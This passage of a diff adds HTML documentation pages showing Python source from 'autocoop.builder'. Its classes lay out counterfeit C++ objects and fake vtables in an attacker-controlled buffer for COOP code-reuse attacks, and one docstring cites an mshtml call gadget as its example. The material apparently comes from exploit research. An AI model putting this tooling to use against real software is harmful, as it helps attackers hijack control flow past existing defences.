+        <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">lblOffsets</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+        <span class="n">mem</span> <span class="o">=</span> <span class="n">Memory</span><span class="p">()</span>
+        <span class="c1"># for all objects...</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+            <span class="n">objOffset</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">]</span>
+            <span class="c1"># ... 1) resolve pointers.</span>
+            <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">resolvePointers</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">lblOffsets</span><span class="p">,</span> <span class="n">objReloc</span><span class="p">)</span>
+            <span class="c1"># ... 2) iterate over all regions with associated data and add them.</span>
+            <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">itRegions</span><span class="p">(</span><span class="n">dataOnly</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+                <span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">objOffset</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">offset</span><span class="p">,</span> <span class="n">region</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+
+
+        <span class="k">return</span> <span class="n">mem</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+
+<div class="viewcode-block" id="BaseBuilder.finalize"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.BaseBuilder.finalize">[docs]</a>    <span class="k">def</span> <span class="nf">finalize</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">maxSize</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Creates the final buffer.</span>
+<span class="sd">        @param maxSize the maximum size of the final buffer. Setting a small size may result in unsatisfiable constraints.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># calc offsets</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_calcOffsets</span><span class="p">(</span><span class="n">maxSize</span><span class="p">)</span>
+        <span class="n">objReloc</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span><span class="p">)</span>
+
+        <span class="c1"># create object buffer</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_createObjBuffer</span><span class="p">(</span><span class="n">objReloc</span><span class="o">=</span><span class="n">objReloc</span><span class="p">)</span></div></div>
+
+<div class="viewcode-block" id="ArrayBuilder"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.ArrayBuilder">[docs]</a><span class="k">class</span> <span class="nc">ArrayBuilder</span><span class="p">(</span><span class="n">BaseBuilder</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Builder for array-based ML-Gs.</span>
+<span class="sd">    The array starts at label LABEL_ARRAY.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">LABEL_ARRAY</span> <span class="o">=</span> <span class="mi">99</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arch</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">mainObj</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        @param baseBuff the base address of the buffer under control</span>
+<span class="sd">        @param mainObj the main object (loop gadget), will not be contained in the gadget chain</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">arch</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">notInArray</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">mainObj</span><span class="p">,</span> <span class="n">inPtrArray</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">_createArray</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">objReloc</span><span class="o">=</span><span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span> <span class="n">metaReloc</span><span class="o">=</span><span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)):</span>
+        <span class="sd">&quot;&quot;&quot; Creates buffer containing pointer to objects and vtables.</span>
+<span class="sd">        Needs to be invoked after _calcOffsets() and before _createObjBuffer().</span>
+<span class="sd">        EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget.</span>
+<span class="sd">        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+        <span class="c1"># calculate the size of the obj-ptr array</span>
+        <span class="n">sizeObjPtrArr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeObjPtrArray</span><span class="p">()</span>
+
+        <span class="c1"># create buffer</span>
+        <span class="n">mem</span> <span class="o">=</span> <span class="n">Memory</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="p">)</span>
+        <span class="n">currOffsetObjPtr</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">currOffsetVtable</span> <span class="o">=</span> <span class="n">sizeObjPtrArr</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+            <span class="k">if</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">notInArray</span><span class="p">:</span> <span class="k">continue</span>
+            <span class="c1"># calc object pointer</span>
+            <span class="n">objPtr</span> <span class="o">=</span> <span class="n">objReloc</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">])</span>
+            <span class="c1"># add object pointer to table</span>
+            <span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">currOffsetObjPtr</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">packNativeInt</span><span class="p">(</span><span class="n">objPtr</span><span class="p">))</span>
+            <span class="n">currOffsetObjPtr</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span>
+
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+
+            <span class="c1"># Enable fake vtables - added by Richard</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">buffVtable</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+                <span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">currOffsetVtable</span><span class="p">,</span> <span class="n">buffVtable</span><span class="p">)</span>
+                <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">metaReloc</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="n">currOffsetVtable</span><span class="p">))</span>
+                <span class="n">currOffsetVtable</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffVtable</span><span class="p">)</span>
+
+        <span class="c1"># write buffer to array region</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">regionArray</span><span class="o">.</span><span class="n">setData</span><span class="p">(</span><span class="n">mem</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">())</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeObjPtrArray</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget.</span>
+<span class="sd">        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">notInArray</span><span class="p">))</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeVtables</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># accumulate the sizes of all fake vtables</span>
+        <span class="n">sizeVtables</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+            <span class="k">if</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="k">continue</span>
+            <span class="n">sizeVtables</span> <span class="o">+=</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span><span class="o">.</span><span class="n">getSize</span><span class="p">()</span>
+
+        <span class="k">return</span> <span class="n">sizeVtables</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeMetaBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Calculates the size of the meta buffer that is created by _createMetaBuffer().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeVtables</span><span class="p">()</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeObjPtrArray</span><span class="p">()</span>
+
+<div class="viewcode-block" id="ArrayBuilder.addObj"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.ArrayBuilder.addObj">[docs]</a>    <span class="k">def</span> <span class="nf">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="n">inPtrArray</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds an object.</span>
+<span class="sd">        @param obj the object to add</span>
+<span class="sd">        @param inPtrArray if false, the object is not put into the array. (All regular objects should be put into the array.)</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">inPtrArray</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">notInArray</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="ArrayBuilder.finalize"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.ArrayBuilder.finalize">[docs]</a>    <span class="k">def</span> <span class="nf">finalize</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+        <span class="c1"># create object to contain array of object pointers</span>
+        <span class="n">objArray</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="p">,</span> <span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">regionArray</span> <span class="o">=</span> <span class="n">Memory</span><span class="o">.</span><span class="n">Region</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeMetaBuffer</span><span class="p">(),</span> <span class="n">label</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">LABEL_ARRAY</span><span class="p">)</span>
+        <span class="n">objArray</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addRegion</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">regionArray</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">objArray</span><span class="p">,</span> <span class="n">inPtrArray</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+        <span class="c1"># calc offsets</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_calcOffsets</span><span class="p">(</span><span class="n">maxOffset</span><span class="p">)</span>
+        
+        <span class="c1"># create array of object pointers</span>
+        <span class="c1">## create relocator for array</span>
+        <span class="n">offsetsArray</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_getOffsetsObj</span><span class="p">(</span><span class="n">objArray</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">offsetsArray</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+        <span class="n">arrayReloc</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span> <span class="o">+</span>  <span class="n">offsetsArray</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="c1">## create relocator for objects</span>
+        <span class="n">objReloc</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_createArray</span><span class="p">(</span><span class="n">objReloc</span><span class="p">,</span> <span class="n">arrayReloc</span><span class="p">)</span>
+
+        <span class="c1"># create object buffer</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_createObjBuffer</span><span class="p">(</span><span class="n">objReloc</span><span class="o">=</span><span class="n">objReloc</span><span class="p">)</span></div></div>
+
+<div class="viewcode-block" id="LinkedListBuilder"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LinkedListBuilder">[docs]</a><span class="k">class</span> <span class="nc">LinkedListBuilder</span><span class="p">(</span><span class="n">BaseBuilder</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Builder for linked list-based ML-Gs.</span>
+<span class="sd">    The first linked list item is labeled with LABEL_BASE_LL. The first object is labeled with LABEL_BASE_OBJ.</span>
+<span class="sd">    Use LABEL_BASE_LL to put a pointer to the first linked list item into your initial object.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">LABEL_BASE_OBJ</span> <span class="o">=</span> <span class="mi">100</span>
+    <span class="n">LABEL_BASE_LL</span> <span class="o">=</span> <span class="mi">101</span>
+
+<div class="viewcode-block" id="LinkedListBuilder.ObjLabels"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LinkedListBuilder.ObjLabels">[docs]</a>    <span class="k">class</span> <span class="nc">ObjLabels</span><span class="p">:</span>
+        <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">labelObj</span><span class="p">,</span> <span class="n">labelLlItem</span><span class="p">):</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">labelObj</span> <span class="o">=</span> <span class="n">labelObj</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">labelLlItem</span> <span class="o">=</span> <span class="n">labelLlItem</span></div>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">offsetPtrObj</span><span class="p">,</span> <span class="n">offsetPtrNext</span><span class="p">,</span> <span class="n">mainObj</span><span class="p">,</span> <span class="n">arch</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        @param baseBuff the base address of the buffer under control</span>
+<span class="sd">        @param offsetPtrObj in the given ML-G&#39;s linked list item layout, the offset of the pointer to the counterfeit object (e.g. +8 if the item layout is as depicted below)</span>
+<span class="sd">        @param offsetPtrNext in the given ML-G&#39;s linked list item layout, the offset of the pointer to the next/forward pointer (e.g. +0 if the item layout is as depicted below)</span>
+<span class="sd">        @param mainObj the main object (loop gadget); will not be contained in the gadget chain.</span>
+<span class="sd">        @param arch the architecture to use.</span>
+
+<span class="sd">        Example:</span>
+<span class="sd">        Consider a linked list item layout as follows:</span>
+
+<span class="sd">        template &lt;typename T&gt;</span>
+<span class="sd">        struct Item</span>
+<span class="sd">        {</span>
+<span class="sd">            Item&lt;T&gt;* next;</span>
+<span class="sd">            T* p;</span>
+<span class="sd">        };</span>
+
+<span class="sd">        For 64-bit, Item comprises of 16 bytes and offsetPtrObj=8 and offsetPtrNext=0 .</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">arch</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">offsetPtrObj</span> <span class="o">=</span> <span class="n">offsetPtrObj</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">offsetPtrNext</span> <span class="o">=</span> <span class="n">offsetPtrNext</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">mainObj</span><span class="p">,</span> <span class="n">linkedList</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">loops</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">labelObj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">LABEL_BASE_OBJ</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">labelLl</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">LABEL_BASE_LL</span>
+
+<div class="viewcode-block" id="LinkedListBuilder.addObj"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LinkedListBuilder.addObj">[docs]</a>    <span class="k">def</span> <span class="nf">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="n">linkedList</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">labelNextItem</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">labelItem</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">lastObj</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds an object.</span>
+<span class="sd">        @param obj the object to add</span>
+<span class="sd">        @param linkedList if false, the object is not put into the linked list. (All regular objects should be put into the linked list.)</span>
+<span class="sd">        @param labelNextItem [optional] the label of the next item.</span>
+<span class="sd">        @param labelItem [optinal] the label of the current item.</span>
+<span class="sd">        @param lastObj [IMPORTANT] is this the last object?</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="n">linkedList</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">labelNextItem</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="c1"># in the default case, the current label +1 is the label of the next item</span>
+                <span class="n">labelNextItem</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">labelLl</span><span class="o">+</span><span class="mi">1</span>
+
+            <span class="k">if</span> <span class="n">labelItem</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">labelItem</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">labelLl</span>
+
+            <span class="c1"># add label to start of object</span>
+            <span class="n">actualLabelObj</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">setLabel</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">labelObj</span><span class="p">)</span>
+            <span class="n">ol</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ObjLabels</span><span class="p">(</span><span class="n">actualLabelObj</span><span class="p">,</span> <span class="n">labelItem</span><span class="p">)</span>
+
+            <span class="c1"># create linked list Item</span>
+            <span class="n">item</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="p">)</span>
+            <span class="c1"># add pointer to next item</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">lastObj</span><span class="p">:</span>
+                <span class="n">item</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">offsetPtrNext</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">labelNextItem</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">labelItem</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="c1"># for the last object we add a dummy next pointer</span>
+                <span class="n">item</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">offsetPtrNext</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="mh">0xBABECAFE</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">labelItem</span><span class="p">)</span>
+            <span class="c1"># add pointer to actual object</span>
+            <span class="n">item</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">offsetPtrObj</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">actualLabelObj</span><span class="p">)</span>
+
+            <span class="c1"># add both object and ll item</span>
+            <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span>
+            <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+
+            <span class="c1"># increase labels</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">labelLl</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">labelObj</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">return</span> <span class="n">ol</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ObjLabels</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span></div></div>
+
+<div class="viewcode-block" id="LooplessBuilder"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LooplessBuilder">[docs]</a><span class="k">class</span> <span class="nc">LooplessBuilder</span><span class="p">(</span><span class="n">BaseBuilder</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Builder for COOP code that does not rely on a conventional ML-G but on a REC-G.</span>
+<span class="sd">    An example for a REC-G is the following virtual destructor:</span>
+
+<span class="sd">    .. code-block:: c++</span>
+<span class="sd">    </span>
+<span class="sd">      class X {</span>
+<span class="sd">          A* a; // class A has a virtual destructor</span>
+<span class="sd">          B* b; // class B has a virtual destructor</span>
+<span class="sd">          virtual void X::~X() {</span>
+<span class="sd">              delete a;</span>
+<span class="sd">              delete b;</span>
+<span class="sd">          }</span>
+<span class="sd">      };</span>
+
+<span class="sd">    With &quot;delete a;&quot; the actual vfgadget is invoked, with &quot;delete b;&quot; X::~X() is invoked recursively.</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">LABEL_FIRST_OBJ</span> <span class="o">=</span> <span class="mi">100</span>
+
+<div class="viewcode-block" id="LooplessBuilder.InvocationDescriptor"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LooplessBuilder.InvocationDescriptor">[docs]</a>    <span class="k">class</span> <span class="nc">InvocationDescriptor</span><span class="p">:</span>
+        <span class="sd">&quot;&quot;&quot; Describes an invocation location in the REC-G. E.g., X::~X() has two invocation locations:</span>
+<span class="sd">        a: vindex=&lt;vtable index of A::~A()&gt;, offsetThisPtr=8</span>
+<span class="sd">        b: vindex=&lt;vtable index of B::~B()&gt;, offsetThisPtr=16</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">vindex</span><span class="p">,</span> <span class="n">offsetThisPtr</span><span class="p">):</span>
+            <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">            @param vindex the vtable index used at the invocation location.</span>
+<span class="sd">            @param offsetThisPtr the object offset from which the REC-G reads the this-ptr for the invocation location.</span>
+<span class="sd">            &quot;&quot;&quot;</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">vindex</span> <span class="o">=</span> <span class="n">vindex</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">offsetThisPtr</span> <span class="o">=</span> <span class="n">offsetThisPtr</span></div>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arch</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">vindexFirst</span><span class="p">,</span> <span class="n">ptrVtableRecGadget</span><span class="p">,</span> <span class="n">descriptors</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        @param arch the architecture.</span>
+<span class="sd">        @param baseBuff the base of the buffer.</span>
+<span class="sd">        @param vindexFirst the vtable index used in the first vcall under attacker control.</span>
+<span class="sd">        @param ptrVtableRecGadget address of a vtable entry of the REC-G.</span>
+<span class="sd">        @param descriptors list of InvocationDescriptor objects that describe the REC-G&#39;s invocation locations.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">arch</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">vindexFirst</span> <span class="o">=</span> <span class="n">vindexFirst</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">descriptors</span> <span class="o">=</span> <span class="n">descriptors</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nObjSlots</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">descriptors</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ptrVtableRecGadget</span> <span class="o">=</span> <span class="n">ptrVtableRecGadget</span>
+
+        <span class="c1"># create the first container</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">container</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="p">,</span> <span class="n">fixedOffset</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">container</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ptrVtableRecGadget</span><span class="p">,</span> <span class="n">vindexFirst</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">container</span><span class="o">.</span><span class="n">setLabel</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">LABEL_FIRST_OBJ</span><span class="p">)</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">container</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">indexObj</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nextLabelObj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">LABEL_FIRST_OBJ</span> <span class="o">+</span> <span class="mi">1</span>
+
